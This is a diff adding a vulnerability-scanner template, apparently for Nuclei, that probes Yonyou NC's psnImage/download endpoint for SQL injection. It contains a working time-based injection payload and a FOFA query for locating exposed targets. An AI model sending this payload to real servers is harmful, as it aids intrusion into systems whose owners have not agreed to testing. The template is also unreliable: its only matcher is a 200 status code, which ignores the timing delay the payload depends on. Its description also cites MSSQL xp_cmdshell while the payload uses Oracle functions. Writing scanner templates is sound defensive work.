@@ -1,0 +1,30 @@
+id: yonyou-nc-psnImage-download-sql
+
+info:
+  name: yonyou-nc-psnImage-download-sql
+  author: yichen
+  severity: high
+  description: |
+    The Yonyou NC/portal/pt/psnImage/download interface has an SQL injection vulnerability, which allows attackers to execute arbitrary commands and control the server by exploiting the SQL injection vulnerability in conjunction with the database xp_cmdshell. After analysis and judgment, the difficulty of exploiting this vulnerability is low, and it is recommended to fix it as soon as possible.
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/141272214
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: icon_hash="1085941792"
+  tags: yonyou,nc,exposure
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/psnImage/download?pageId=login&pk_psndoc=1%27)%20AND%206322=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(79)||CHR(66)||CHR(101),8)%20AND%20(%27rASZ%27=%27rASZ HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200
